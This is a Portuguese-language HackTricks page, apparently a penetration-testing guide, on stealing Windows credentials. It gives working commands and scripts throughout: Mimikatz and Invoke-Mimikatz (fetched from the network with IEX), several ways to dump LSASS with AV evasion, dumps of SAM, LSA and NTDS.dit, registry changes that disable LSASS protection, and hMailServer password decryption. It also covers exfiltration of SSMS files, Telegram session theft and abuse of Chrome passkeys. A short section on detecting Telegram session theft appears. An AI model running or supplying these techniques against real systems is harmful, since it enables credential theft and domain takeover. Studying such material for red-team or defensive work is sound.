# Roubo de Credenciais do Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenciais do Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Encontre outras coisas que o Mimikatz pode fazer em** [**esta página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Saiba mais sobre algumas proteções possíveis para credenciais aqui.**](credentials-protections.md) **Estas proteções podem impedir que o Mimikatz extraia algumas credenciais.**

## Credenciais com Meterpreter

Use o [**Plugin de Credenciais**](https://github.com/carlospolop/MSF-Credentials) **que** criei para **buscar senhas e hashes** no sistema da vítima.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Contornando o AV

### Procdump + Mimikatz

Como o **Procdump da** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, ele não é detectado pelo Defender.\
Você pode usar essa ferramenta para **fazer o dump do processo lsass**, **baixar o dump** e **extrair** as **credenciais localmente** do dump.

Você também pode usar [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

This processo é realizado automaticamente com [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alguns **AV** podem **detectar** o uso de **procdump.exe para fazer dump de lsass.exe** como **malicioso**, pois estão **detectando** as strings **"procdump.exe" e "lsass.exe"**. Portanto, é mais **furtivo** passar o **PID** de lsass.exe como **argumento** para o procdump, **em vez do** **nome lsass.exe.**

### Dumping de lsass com **comsvcs.dll**

Uma DLL chamada **comsvcs.dll**, encontrada em `C:\Windows\System32`, é responsável por **fazer dump da memória de processos** em caso de falha. Essa DLL inclui uma **função** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\
É irrelevante usar os dois primeiros argumentos, mas o terceiro é dividido em três componentes. O ID do processo do qual será feito o dump é o primeiro componente, o local do arquivo de dump é o segundo, e o terceiro componente deve ser estritamente a palavra **full**. Não há opções alternativas.\
Após analisar esses três componentes, a DLL cria o arquivo de dump e transfere para ele a memória do processo especificado.\
É possível usar **comsvcs.dll** para fazer dump do processo lsass, eliminando assim a necessidade de enviar e executar o procdump. Esse método é descrito em detalhes em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

O seguinte comando é usado para executar:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Você pode automatizar esse processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping de lsass com o Gerenciador de Tarefas**

1. Clique com o botão direito na Barra de tarefas e clique em Gerenciador de Tarefas
2. Clique em Mais detalhes
3. Procure o processo "Local Security Authority Process" na guia Processos
4. Clique com o botão direito no processo "Local Security Authority Process" e clique em "Criar arquivo de dump".

### Dumping de lsass com procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binário assinado pela Microsoft que faz parte do pacote [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Um dump de falha de sistema completo já existente, ou uma cópia compactada em uma pasta de usuário acessível, pode reter material de credenciais para análise offline. Nomes de arquivo como `MEMORY.DMP` e `MEMORY.7z` são apenas pistas para análise: verifique a procedência e o acesso, e não presuma que contenham credenciais utilizáveis ou atuais.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Extração offline de credenciais de snapshots de VM

Um backup legível de VM pode conter uma **imagem salva da memória do guest**, mesmo sem acesso ao guest em execução ou ao LSASS. No VMware, identifique os metadados do snapshot `.vmsn` e o arquivo `.vmem` correspondente, quando presente; não confunda nenhum deles com uma imagem de disco `.vmdk`. O `VMkatz` analisa snapshots ou entradas de diretórios de VMs e pode recuperar [credenciais de sessões de logon do Windows](credentials-mimikatz.md), como hashes e tickets, da memória do guest. Também pode inspecionar discos virtuais em busca de material SAM/LSA. O pré-requisito é ter acesso aos arquivos de backup, não direitos de depuração na VM em execução.<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

O exemplo em Checkpoint recuperou um hash NT do Administrator **local** de um snapshot de VM independente. Ele só autenticou no domínio depois que o reuso de senha foi verificado separadamente; um hash local de um backup não é inerentemente uma credencial de domínio. Em um host com memória limitada, o VMkatz pode verificar e liberar páginas incrementalmente, mas copiar o snapshot para um host de análise maior ainda pode ser preferível.<sup>[[17]](#references)[[18]](#references)</sup>

## Despejando lsass com PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma ferramenta de despejo de processos protegidos que oferece suporte à ofuscação de despejos de memória e à transferência deles para estações de trabalho remotas sem gravá-los em disco.

**Funcionalidades principais**:

1. Contornar a proteção PPL
2. Ofuscar arquivos de despejo de memória para evitar mecanismos de detecção do Defender baseados em assinaturas
3. Carregar despejos de memória usando métodos de upload RAW e SMB, sem gravá-los em disco (despejo fileless)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – Dump de LSASS baseado em SSP sem MiniDumpWriteDump

O Ink Dragon distribui um dumper de três etapas chamado **LalsDumper** que nunca chama `MiniDumpWriteDump`, então os hooks de EDR nessa API nunca são acionados:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – procura em `fdp.dll` um placeholder composto por 32 caracteres `d` minúsculos, substitui-o pelo caminho absoluto para `rtu.txt`, salva a DLL modificada como `nfdp.dll` e chama `AddSecurityPackageA("nfdp","fdp")`. Isso força o **LSASS** a carregar a DLL maliciosa como um novo Security Support Provider (SSP).
2. **Stage 2 dentro do LSASS** – quando o LSASS carrega `nfdp.dll`, a DLL lê `rtu.txt`, aplica XOR a cada byte com `0x20` e mapeia o blob decodificado na memória antes de transferir a execução.
3. **Stage 3 dumper** – o payload mapeado reimplementa a lógica do MiniDump usando **syscalls diretas** resolvidas a partir de nomes de API com hash (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Uma exportação dedicada chamada `Tom` abre `%TEMP%\<pid>.ddt`, grava um dump comprimido do LSASS no arquivo e fecha o identificador para que a exfiltração possa ocorrer mais tarde.

Observações para o operador:

* Mantenha `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` no mesmo diretório. O Stage 1 substitui o placeholder codificado pelo caminho absoluto para `rtu.txt`, então separá-los interrompe a cadeia.
* O registro ocorre adicionando `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Você pode inserir esse valor manualmente para fazer o LSASS carregar o SSP novamente a cada inicialização.
* Os arquivos `%TEMP%\*.ddt` são dumps comprimidos. Descomprima-os localmente e, em seguida, use Mimikatz/Volatility para extrair credenciais.
* A execução de `lals.exe` exige privilégios de admin/SeTcb para que `AddSecurityPackageA` tenha êxito; quando a chamada retorna, o LSASS carrega o SSP malicioso de forma transparente e executa o Stage 2.
* Remover a DLL do disco não a descarrega do LSASS. Exclua a entrada do registro e reinicie o LSASS (reinicializando o sistema) ou deixe-a lá para persistência de longo prazo.

## CrackMapExec

### Dump de hashes do SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Extrair segredos do LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Extrair o NTDS.dit do DC de destino

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump do histórico de senhas do NTDS.dit do DC alvo

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Mostrar o atributo pwdLastSet de cada conta do NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Roubando SAM & SYSTEM

Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **não é possível simplesmente copiá-los da maneira habitual** porque estão protegidos.

### Do Registry

A maneira mais fácil de obter uma cópia desses arquivos é extraí-la do Registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Baixe** esses arquivos para sua máquina Kali e **extraia os hashes** usando:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Você pode copiar arquivos protegidos usando esse serviço. É necessário ser Administrador.

Para um fluxo de trabalho diferente, usando snapshots já expostos em um compartilhamento de rede legível, consulte [SMB Previous Versions](../../network-services-pentesting/pentesting-smb/#read-previous-versions-exposed-by-a-share).

#### Usando vssadmin

O binário vssadmin está disponível apenas nas versões do Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Mas você também pode fazer o mesmo usando **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (o disco rígido usado é "C:" e ele é salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Código do livro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Por fim, você também poderia usar o [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia de SAM, SYSTEM e ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Credenciais do Active Directory - NTDS.dit**

O arquivo **NTDS.dit** é conhecido como o coração do **Active Directory**, pois contém dados cruciais sobre objetos de usuário, grupos e suas associações. É nele que são armazenados os **hashes de senha** dos usuários do domínio. Esse arquivo é um banco de dados **Extensible Storage Engine (ESE)** e fica em **_%SystemRoom%/NTDS/ntds.dit_**.

Esse banco de dados mantém três tabelas principais:

- **Tabela de Dados**: responsável por armazenar detalhes sobre objetos, como usuários e grupos.
- **Tabela de Links**: mantém o controle de relações, como associações a grupos.
- **Tabela SD**: contém **descritores de segurança** de cada objeto, garantindo a segurança e o controle de acesso aos objetos armazenados.

A pesquisa de Christoffer Andersson sobre a camada de banco de dados documenta essas tabelas e seu comportamento específico por versão com mais detalhes.<sup>[[8]](#references)</sup>

O Windows usa _Ntdsa.dll_ para interagir com esse arquivo, e ele é usado pelo _lsass.exe_. Assim, **parte** do arquivo **NTDS.dit** pode estar localizada **na memória do `lsass`** (provavelmente os dados acessados mais recentemente, devido ao ganho de desempenho proporcionado pelo uso de um **cache**).

#### Descriptografando os hashes dentro de NTDS.dit

O hash é criptografado três vezes:

1. Descriptografe a Password Encryption Key (**PEK**) usando o **BOOTKEY** e **RC4**.
2. Descriptografe o **hash** usando a **PEK** e **RC4**.
3. Descriptografe o **hash** usando **DES**.

A **PEK** tem o **mesmo valor em cada controlador de domínio**, mas é **criptografada** dentro de **NTDS.dit** com o **BOOTKEY** específico do controlador de domínio, obtido do hive **SYSTEM** desse controlador. Portanto, para extrair credenciais, são necessários **NTDS.dit** e **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Uma [técnica de redirecionamento da tabela de handles do kernel](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) separada pode copiar um objeto de arquivo NTDS já aberto sem VSS, mas requer uma primitiva arbitrária de leitura/gravação no kernel do controlador de domínio.<sup>[[16]](#references)</sup>

### Copiando NTDS.dit usando Ntdsutil

Disponível desde o Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Você também pode usar o truque de [**volume shadow copy**](#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que também precisará de uma cópia do **arquivo SYSTEM** (novamente, use o truque [**para extraí-lo do registro ou usar o volume shadow copy**](#stealing-sam-and-system)).

### **Extraindo hashes do NTDS.dit**

Depois de **obter** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como _secretsdump.py_ para **extrair os hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Você também pode **extraí-las automaticamente** usando um usuário administrador do domínio válido:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Para **arquivos NTDS.dit grandes**, recomenda-se extraí-los usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Por fim, você também pode usar o **módulo do metasploit**: _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraindo objetos de domínio de NTDS.dit para um banco de dados SQLite**

Os objetos NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Além dos secrets, os objetos completos e seus atributos também são extraídos para permitir a obtenção de mais informações quando o arquivo NTDS.dit bruto já tiver sido obtido.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

A hive `SYSTEM` é opcional, mas permite a descriptografia de segredos (hashes NT e LM, credenciais suplementares, como senhas em texto claro, chaves Kerberos ou de trust, históricos de senhas NT e LM). Além de outras informações, são extraídos os seguintes dados: contas de usuário e de máquina com seus hashes, flags UAC, data e hora do último logon e da alteração de senha, descrições das contas, nomes, UPN, SPN, grupos e associações recursivas, árvore de unidades organizacionais e associações, domínios confiáveis com tipo, direção e atributos dos trusts...

## Lazagne

Baixe o binário [aqui](https://github.com/AlessandroZ/LaZagne/releases). Você pode usar este binário para extrair credenciais de vários softwares.

```
lazagne.exe all
```

## Outras ferramentas para extrair credenciais do SAM e do LSASS

### Windows credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Faça o download em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrair credenciais do arquivo SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Extraia credenciais do arquivo SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Baixe-o em:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e simplesmente **execute-o** para extrair as senhas.

## Coletando sessões RDP ociosas e enfraquecendo controles de segurança

O FinalDraft RAT do Ink Dragon inclui uma tarefa `DumpRDPHistory`, cujas técnicas são úteis para qualquer red-teamer:<sup>[[3]](#references)</sup>

### Coleta de telemetria no estilo DumpRDPHistory

* **Destinos RDP de saída** – analise cada hive de usuário em `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subchave armazena o nome do servidor, `UsernameHint` e o carimbo de data/hora da última gravação. Você pode replicar a lógica do FinalDraft com PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Evidências de RDP de entrada** – consulte o log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pelos IDs de Evento **21** (logon bem-sucedido) e **25** (desconexão) para identificar quem administrou a máquina:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Depois de descobrir qual Domain Admin se conecta regularmente, faça o dump do LSASS (com LalsDumper/Mimikatz) enquanto a sessão **desconectada** ainda existir. O fallback de CredSSP + NTLM deixa o verificador e os tokens no LSASS, que podem então ser reutilizados via SMB/WinRM para obter o `NTDS.dit` ou estabelecer persistência em controladores de domínio.

### Downgrades do Registro visados pelo FinalDraft

O mesmo implante também altera várias chaves do Registro para facilitar o roubo de credenciais:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` desabilita Restricted Admin para conexões RDP de entrada; isso **não** habilita pass-the-hash por meio desse modo. Definir o valor como `0` permite Restricted Admin no destino, mas o cliente precisa solicitar `/RestrictedAdmin` ou usar uma política que exija Restricted Admin.<sup>[[14]](#references)</sup> Um hash, por si só, não concede direitos de administrador remoto; consulte [pré-requisitos de autenticação RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` desabilita a filtragem de tokens do UAC, para que administradores locais recebam tokens irrestritos pela rede.
* `DSRMAdminLogonBehavior=2` permite que o administrador do DSRM faça logon enquanto o DC está online, dando aos atacantes outra conta integrada com privilégios elevados.
* `RunAsPPL=0` remove as proteções PPL do LSASS, tornando trivial o acesso à memória para dumpers como o LalsDumper.

## Credenciais de configuração do hMailServer (pós-comprometimento)

Verifique os arquivos de configuração exatos `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` e `C:\ProgramData\hMailServer\hMailServer.ini`, de acordo com o layout da instalação. Um valor `[Security] AdministratorPassword=` legível e não vazio é um hash da senha de administração do hMailServer; não é evidência de uma senha de administrador do Windows. Se essa credencial for recuperada, qualquer pivot para uma conta do Windows exige reutilização de senha e direitos de logon verificados de forma independente.

Em instalações que usam um banco de dados SQL CE, o valor separado `[Database] Password=` no INI protege o banco de dados. Em instalações legadas, esse valor é criptografado com Blowfish usando a chave estática `THIS_KEY_IS_NOT_SECRET` e trocas de endianness de palavras de 4 bytes. Use a string hexadecimal do INI com este snippet de Python:<sup>[[2]](#references)</sup>

Primeiro, confirme que a conta atual consegue ler **tanto** o INI quanto o arquivo `.sdf` correspondente do banco de dados SQL CE. A senha do INI protege o banco de dados; ela é separada dos hashes das contas de caixa de correio armazenados nele. Inspecione ou atualize uma **cópia** de um banco de dados em uso, nunca o arquivo ativo.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Com a senha em texto simples, copie o banco de dados SQL CE para evitar bloqueios de arquivo, carregue o provedor de 32 bits e atualize-o, se necessário, antes de consultar os hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

A coluna `accountpassword` usa o formato de hash do hMailServer (modo `1421` do hashcat). Uma senha de caixa de correio crackeada só se torna um pivot para uma conta de usuário do Windows se essa senha também for usada por uma conta local/de domínio e essa conta tiver os direitos necessários para logon remoto.

## Interceptação do callback de logon da LSA (LsaApLogonUserEx2)

Algumas ferramentas capturam **senhas de logon em texto simples** interceptando o callback de logon da LSA `LsaApLogonUserEx2`. A ideia é fazer hook ou wrapper do callback do pacote de autenticação para capturar credenciais **durante o logon** (antes do hashing) e, em seguida, gravá-las em disco ou retorná-las ao operador. Isso costuma ser implementado como um auxiliar que injeta código na LSA ou se registra nela e, então, registra cada evento de logon interativo/de rede bem-sucedido com o nome de usuário, o domínio e a senha.<sup>[[1]](#references)</sup>

Notas operacionais:
- Requer admin local/SYSTEM para carregar o auxiliar no fluxo de autenticação.
- As credenciais capturadas só aparecem quando ocorre um logon (interativo, RDP, de serviço ou de rede, dependendo do hook).

## Credenciais de conexão salvas do SSMS (sqlstudio.bin)

O SQL Server Management Studio (SSMS) armazena informações de conexão salvas em um arquivo `sqlstudio.bin` por usuário. Ferramentas de dump especializadas podem analisar o arquivo e recuperar credenciais SQL salvas. Em shells que só retornam a saída de comandos, o arquivo costuma ser exfiltrado codificando-o em Base64 e exibindo-o em stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

No lado do operador, reconstrua o arquivo e execute o dumper localmente para recuperar credenciais:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Roubo de sessões do navegador e cookies via Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Roubo de sessões `tdata` do Telegram Desktop

O Telegram Desktop mantém os dados de autorização e o estado da conta em seu diretório **`tdata`**. Uma sessão copiada pode ser carregada por ferramentas compatíveis para autenticar sem a senha da conta enquanto essa autorização permanecer válida; se a criptografia de dados locais estiver habilitada, o stealer também precisará da senha de acesso. Uma sessão autenticada pode então expor dados de identidade, metadados de conversas e participação em grupos, mensagens e mídias que podem ser baixadas.<sup>[[10]](#references)</sup>

### Descoberta e obtenção

Pesquise os diretórios de instalações convencionais e portáteis; os nomes dos pacotes da Microsoft Store variam, então enumere os diretórios de pacotes que contenham `TelegramMessenge` e inspecione a subárvore `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Se as leituras comuns falharem e o token do processo **já contiver e habilitar** `SeBackupPrivilege`, o acesso compatível com backup oferece uma alternativa; ele não obtém o privilégio nem eleva o processo. `CreateFileW` com `FILE_FLAG_BACKUP_SEMANTICS` pode solicitar semântica de backup/restauração e ignorar verificações de segurança de arquivos quando os privilégios necessários estiverem presentes no token, mas a flag, por si só, não supera um bloqueio de compartilhamento incompatível.<sup>[[10]](#references)[[11]](#references)</sup>

Para arquivos em uso e bloqueados, crie/leia uma **Volume Shadow Copy**; para arquivos bloqueados por ACLs, `robocopy /B` usa o modo de backup e ignora as ACLs de arquivos e diretórios.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Um implant que economiza largura de banda pode enviar primeiro apenas o inventário de caminhos dos arquivos, receber um identificador de snapshot junto com os caminhos já armazenados pelo C2 e carregar somente os arquivos ausentes. Portanto, pequenas transferências incrementais após a enumeração recursiva de `tdata` ainda podem representar um roubo de sessão bem-sucedido.<sup>[[10]](#references)</sup>

### Detecção e contenção

Correlacione o acesso recursivo a `tdata` por um processo que não seja do Telegram com a habilitação de `SeBackupPrivilege`, aberturas de arquivos com semântica de backup, atividade de VSS ou um processo filho `robocopy.exe` usando `/B`. Procure também a enumeração rápida de `%APPDATA%` e `%LOCALAPPDATA%\Packages`, seguida de conexões de saída do mesmo processo. Após o comprometimento, use **Configurações → Dispositivos** (ou **Privacidade e Segurança → Sessões ativas**) para encerrar sessões não reconhecidas; habilitar a verificação em duas etapas, por si só, não revoga uma autorização que já foi roubada.<sup>[[10]](#references)[[13]](#references)</sup>

## Roubo de credenciais de Passkeys / WebAuthn do Chrome no Windows

Se for obtida execução de código como **usuário vítima** em um host Windows que use **Chrome + passkeys sincronizadas pelo Google Password Manager**, as passkeys se tornam um alvo interessante de pós-exploração, mesmo **sem admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artefatos locais interessantes

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** armazena registros **`WebauthnCredentialSpecifics`** codificados em protobuf. Um processo do mesmo usuário pode enumerar o **RP ID**, o **username**, o **credential ID** e o material da chave privada criptografada das passkeys sincronizadas.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** armazena o estado local de inscrição do dispositivo, como **`wrapped_identity_private_key`** e o segredo encapsulado usado para recuperar credenciais sincronizadas.<sup>[[4]](#references)</sup>

Triagem rápida:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Blobs de chave vinculados ao TPM ainda podem ser abusados como um oráculo local de assinatura

Se o navegador exportar uma chave de identidade respaldada pelo TPM como **`NCRYPT_OPAQUE_KEY_BLOB`** e armazenar esse blob em um estado acessível ao usuário, o malware **não** precisa extrair a chave privada bruta. Ele pode simplesmente reimportar o blob na **mesma máquina** e pedir ao TPM local que assine dados controlados pelo invasor:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Isso significa que **o vínculo ao hardware impede a exportação para fora do dispositivo, mas não o uso pelo mesmo usuário no endpoint comprometido**.

### Caminhos práticos de abuso

1. **Pass-ta-key / retransmissão de identidade do dispositivo**<sup>[[4]](#references)</sup>
   - Enumerar `WebauthnCredentialSpecifics` no LevelDB do Chrome.
   - Iniciar um login com passkey e obter um desafio WebAuthn novo.
   - Usar o blob `wrapped_identity_private_key` roubado no TPM da vítima para assinar a vinculação da solicitação do autenticador em nuvem.
